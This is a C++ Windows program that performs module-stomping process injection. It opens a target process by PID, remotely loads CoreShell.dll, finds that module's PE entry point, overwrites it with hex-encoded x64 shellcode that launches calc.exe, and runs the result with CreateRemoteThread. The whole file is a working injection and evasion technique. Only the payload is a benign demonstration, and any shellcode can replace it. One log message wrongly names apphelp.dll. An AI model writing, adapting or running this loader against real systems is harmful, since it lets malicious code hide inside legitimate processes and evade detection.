#include <iostream>
#include <Windows.h>
#include <vector>
#include <string>
#include <psapi.h>

std::vector<BYTE> parseShellcode(const std::string& hexData) {
    std::vector<BYTE> bytes;
    size_t pos = 0;
    while (pos < hexData.length()) {
        if (hexData[pos] == '-') ++pos;
        if (pos + 1 < hexData.length()) {
            BYTE val = 0;
            sscanf_s(hexData.c_str() + pos, "%2hhx", &val);
            bytes.push_back(val);
            pos += 2;
        }
    }
    return bytes;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <pid>\n";
        return 1;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
    if (!hProc) {
        std::cerr << "Failed to open process.\n";
        return 1;
    }

    // Benign module for stomping
    const wchar_t* benignMod = L"C:\\Windows\\System32\\CoreShell.dll";
    void* modPath = VirtualAllocEx(hProc, nullptr, wcslen(benignMod) * sizeof(wchar_t) + sizeof(wchar_t),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!modPath) {
        CloseHandle(hProc);
        return 1;
    }
    WriteProcessMemory(hProc, modPath, benignMod, wcslen(benignMod) * sizeof(wchar_t) + sizeof(wchar_t), nullptr);

    // Load the benign module remotely
    auto loadLib = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    HANDLE hLoadThread = CreateRemoteThread(hProc, nullptr, 0, loadLib, modPath, 0, nullptr);
    if (hLoadThread) {
        WaitForSingleObject(hLoadThread, INFINITE);
        CloseHandle(hLoadThread);
    }
    VirtualFreeEx(hProc, modPath, 0, MEM_RELEASE);

    // Locate the loaded module's base
    HMODULE mods[1024];
    DWORD cbNeeded;
    if (EnumProcessModules(hProc, mods, sizeof(mods), &cbNeeded)) {
        HMODULE targetMod = nullptr;
        char modName[256];
        DWORD modCount = cbNeeded / sizeof(HMODULE);
        for (DWORD i = 0; i < modCount; ++i) {
            if (GetModuleBaseNameA(hProc, mods[i], modName, sizeof(modName))) {
                if (_stricmp(modName, "CoreShell.dll") == 0) {
                    targetMod = mods[i];
                    std::cout << "Found apphelp.dll base: 0x" << std::hex << targetMod << std::dec << "\n";
                    break;
                }
            }
        }
        if (!targetMod) {
            CloseHandle(hProc);
            return 1;
        }

        // Extract PE entry point
        BYTE peBuf[4096];
        SIZE_T readBytes;
        if (ReadProcessMemory(hProc, targetMod, peBuf, sizeof(peBuf), &readBytes) && readBytes >= sizeof(IMAGE_DOS_HEADER)) {
            auto dosHdr = reinterpret_cast<const IMAGE_DOS_HEADER*>(peBuf);
            if (dosHdr->e_magic == IMAGE_DOS_SIGNATURE) {
                auto ntHdr = reinterpret_cast<const IMAGE_NT_HEADERS*>(reinterpret_cast<const BYTE*>(dosHdr) + dosHdr->e_lfanew);
                if (ntHdr->Signature == IMAGE_NT_SIGNATURE) {
                    void* entryPt = reinterpret_cast<void*>(reinterpret_cast<DWORD_PTR>(targetMod) + ntHdr->OptionalHeader.AddressOfEntryPoint);
                    std::cout << "Entry point: 0x" << std::hex << entryPt << std::dec << "\n";

                    // Payload: calc.exe (hex-encoded)
                    const std::string payloadHex = "fc-48-83-e4-f0-e8-c0-00-00-00-41-51-41-50-52-51-56-48-31-d2-65-48-8b-52-60-48-8b-52-18-48-8b-52-20-48-8b-72-50-48-0f-b7-4a-4a-4d-31-c9-48-31-c0-ac-3c-61-7c-02-2c-20-41-c1-c9-0d-41-01-c1-e2-ed-52-41-51-48-8b-52-20-8b-42-3c-48-01-d0-8b-80-88-00-00-00-48-85-c0-74-67-48-01-d0-50-8b-48-18-44-8b-40-20-49-01-d0-e3-56-48-ff-c9-41-8b-34-88-48-01-d6-4d-31-c9-48-31-c0-ac-41-c1-c9-0d-41-01-c1-38-e0-75-f1-4c-03-4c-24-08-45-39-d1-75-d8-58-44-8b-40-24-49-01-d0-66-41-8b-0c-48-44-8b-40-1c-49-01-d0-41-8b-04-88-48-01-d0-41-58-41-58-5e-59-5a-41-58-41-59-41-5a-48-83-ec-20-41-52-ff-e0-58-41-59-5a-48-8b-12-e9-57-ff-ff-ff-5d-48-ba-01-00-00-00-00-00-00-00-48-8d-8d-01-01-00-00-41-ba-31-8b-6f-87-ff-d5-bb-e0-1d-2a-0a-41-ba-a6-95-bd-9d-ff-d5-48-83-c4-28-3c-06-7c-0a-80-fb-e0-75-05-bb-47-13-72-6f-6a-00-59-41-89-da-ff-d5-63-61-6c-63-2e-65-78-65-00";
                    auto shellBytes = parseShellcode(payloadHex);

                    // Stomp the entry point with payload
                    WriteProcessMemory(hProc, entryPt, shellBytes.data(), shellBytes.size(), nullptr);

                    // Trigger execution
                    CreateRemoteThread(hProc, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(entryPt), nullptr, 0, nullptr);
                }
            }
        }
    }

    CloseHandle(hProc);
    return 0;
}